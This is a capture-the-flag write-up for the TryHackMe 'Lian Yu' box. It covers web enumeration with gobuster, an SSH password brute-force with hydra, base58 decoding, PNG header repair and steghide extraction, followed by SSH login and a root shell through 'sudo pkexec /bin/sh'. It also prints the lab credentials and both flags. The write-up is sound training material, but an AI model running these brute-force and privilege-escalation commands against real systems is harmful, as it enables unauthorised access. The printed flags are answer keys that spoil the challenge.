---
title: "THM Lian Yu"
date: 2026-07-10
tags: [thm, easy, linux, ftp, gobuster, base58, steganography, steghide, pkexec, privesc]
platform: thm
description: "An Arrow-themed box: web enum leaks a hidden ticket, base58 gives the FTP password, a corrupted PNG hides a passphrase, steghide pops a zip, and pkexec hands over root."
outline: [2, 3]
---

# THM Lian Yu

This is an *Arrow*-themed box and it's rated Easy, but don't let that fool you — there's no exploit to fire here. The whole thing is enumeration and messing with files. You dig through nested web folders to find a hidden ticket, decode it, log into FTP, then spend most of your time doing forensics on three images before you finally get a shell. Root is the only quick part.

I'll walk through it the way I actually did it, including the part where I wasted time going down the wrong road.

## Recon

Kicked things off with a normal nmap:

```bash
nmap -sV -sC 10.49.187.171
```

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
```

Four ports. 111 (rpcbind) isn't going anywhere on a box like this. SSH and FTP both want credentials I don't have yet, and anonymous FTP is closed. So the only door that's actually open is **port 80**, and that's where I started.

## Enumeration

### Directory brute-force on port 80

The homepage just says "Purgatory" and does nothing, so straight to gobuster:

```bash
gobuster dir -u http://10.49.187.171 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```
/server-status        (Status: 403)
/island               (Status: 301)  →  /island/
```

`/island/` is the one to chase. Open it in the browser and read the page — there's a word sitting in the content:

```
vigilante
```

Looks like a username. I noted it and moved on.

Here's where I lost some time: I assumed `vigilante` was an SSH login and threw hydra at it.

```bash
hydra -l vigilante -P /usr/share/wordlists/rockyou.txt ssh://10.49.187.171
```

Nothing. In hindsight this was the wrong instinct — on an easy box, a username you find this easily is almost never something you brute-force. It's the first half of a credential, and the second half is sitting somewhere else you haven't looked yet. Lesson learned: keep enumerating before you start attacking.

### Deeper into /island/

`/island/` is a directory, so I brute-forced *inside* it, this time with a bigger list:

```bash
gobuster dir -u http://10.49.187.171/island/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

```
/2100                 (Status: 301)  →  /island/2100/
```

The `/island/2100/` page tells you to look for a `.ticket` file. That's a file *extension*, not a folder — so the next gobuster run needs `-x ticket` so it tacks the extension onto every word in the list.

```bash
gobuster dir -u http://10.49.187.171/island/2100/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x ticket
```

That found `green_arrow.ticket`. Viewing the source of it:

![The green_arrow.ticket page — a note and a base58 string](/writeups/thm-lian-yu/ticket-base58.png)

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

### Decoding the ticket

`RTy8yhBQdscX` isn't a plaintext password. What tipped me off that it was base58 and not base64: there's no padding (`=`), no `+` or `/`, and none of the lookalike characters base58 deliberately drops (`0`, `O`, `I`, `l`). That character set is basically the Bitcoin-address alphabet. Decode it:

```bash
echo -n 'RTy8yhBQdscX' | base58 -d
# → !#th3h00d
```

`!#th3h00d`. Put that together with the `vigilante` username from earlier and I finally had an FTP login.

## FTP — pulling the loot

```bash
ftp 10.49.187.171
# Name: vigilante
# Password: !#th3h00d
ftp> dir
```

There are three images on the share plus a file called `other_user`. I pulled everything down:

```bash
ftp> get Leave_me_alone.png
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
ftp> get other_user
```

`cat other_user` drops a hint mentioning the name **slade** — a second username, which I figured would be for SSH later.

Now the images. Before touching any stego tool, run `file` on them — it tells you which of these are even real images:

```bash
file *.png *.jpg
```

`Leave_me_alone.png` comes back as **`data`**, not a PNG. When a thing that's supposed to be an image gets called "data," it usually means the file header has been messed with.

### Fixing the broken PNG

Every PNG starts with the same 8 bytes:

```
89 50 4E 47 0D 0A 1A 0A
```

I opened `Leave_me_alone.png` in a hex editor to see what it actually starts with:

![xxd of the broken PNG — first four bytes are 58 45 6F AE](/writeups/thm-lian-yu/png-header-broken.png)

```
58 45 6F AE 0D 0A 1A 0A   ...
```

The last four bytes are fine — only the first four (`58 45 6F AE`) are wrong. So I overwrote them with the correct magic number (`89 50 4E 47`) and saved:

![xxd after the fix — header now reads 89 50 4E 47 .PNG](/writeups/thm-lian-yu/png-header-fixed.png)

Now it's a valid PNG. Opening the repaired image, it just shows the word **`password`**. That's not a throwaway — it's the passphrase for the next step, so keep it.

::: tip Why fixing 4 bytes was enough
Only the magic number was damaged; everything after it (the actual image data) was intact. Those first bytes are what `file` and image viewers check to decide whether to parse the file at all, so repairing them is the entire fix — no need to rebuild chunks or CRCs.
:::

### steghide on the JPEG

Running `steghide info` on the images, `aa.jpg` has something embedded and it's passphrase-protected — and I just found a passphrase:

![steghide info on aa.jpg showing embedded ss.zip](/writeups/thm-lian-yu/steghide-info.png)

```
embedded file "ss.zip":
  size: 596.0 Byte
  encrypted: rijndael-128, cbc
  compressed: yes
```

So it's carrying a `ss.zip`. Extract it with the passphrase from the repaired image:

```bash
steghide extract -sf aa.jpg
# Enter passphrase: password
# wrote extracted data to "ss.zip".
```

Unzip it:

```bash
unzip ss.zip
#   inflating: passwd.txt
#   inflating: shado
```

`passwd.txt` is just backstory flavor text — an Oliver Queen / island paragraph, a red herring. `shado` is the actual payload:

```bash
cat shado
# M3tahuman
```

`M3tahuman` — that's the SSH password for slade.

## Getting a shell as slade

```bash
ssh slade@10.49.187.171
# password: M3tahuman
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

User flag done.

## Privilege escalation — pkexec

First thing I always check after landing a shell is what sudo will let me run:

```bash
sudo -l
# (ALL : ALL) /usr/bin/pkexec
```

`pkexec` is PolicyKit's version of sudo — it runs a program as another user, root by default. If I'm allowed to run it through sudo, I can just ask it for a root shell:

```bash
sudo pkexec /bin/sh
# whoami → root
```

The THM task warns the root flag isn't in the obvious place, so instead of guessing I searched for it:

```bash
find / -type f -name root.txt 2>/dev/null
# /root/root.txt
```

(The `2>/dev/null` on the end just hides all the "Permission denied" spam so you only see real results — that command is the one I reach for constantly.)

```bash
cat /root/root.txt
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

## Flags

| Flag | Value |
|------|-------|
| User | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| Root | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}` |

And that's the box. For an "easy" rating it packs in more steps than most — three different encodings/forensics tricks back to back. The two things I'd hand to anyone doing it next: run `file` before you ever open a stego tool, and don't start brute-forcing the second you find a username.
